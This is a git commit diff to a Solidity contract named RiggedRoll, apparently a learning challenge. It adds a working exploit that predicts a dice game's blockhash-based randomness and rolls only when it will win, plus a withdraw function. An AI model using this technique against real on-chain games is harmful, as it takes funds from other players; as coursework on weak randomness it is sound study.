22a717420dd3a7150de2468bebe94fe5c2d35365
Heisenberg-737 <pranay.kothari17@gmail.com>
2023-02-17 23:13:23 +0530

    app working

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -13,12 +13,28 @@ contract RiggedRoll is Ownable {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    //Add withdraw function to transfer ether from the rigged contract to an address
-
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public {
+        require(address(this).balance >= .002 ether, "Insufficient Balance");
+
+        bytes32 previousHash = blockhash(block.number - 1);
+        uint256 nonce = diceGame.nonce();
+        bytes32 hash = keccak256(abi.encodePacked(previousHash, address(this), nonce));
+        uint256 roll = uint256(hash) % 16;
+        require(roll <= 2, "Try Again!!");
+        diceGame.rollTheDice{value: 0.002 ether}();
+        console.log(roll);
+    }
+
+    //Add withdraw function to transfer ether from the rigged contract to an address
+    function withdraw(address receiver, uint256 amount) public onlyOwner {
+        (bool success, ) = payable(receiver).call{value: amount}("");
+        require(success, "Transfer failed!");
+    }
 
 
     //Add receive() function so contract can receive Eth
-    
+    receive() external payable {}
+    fallback() external payable {}
 }
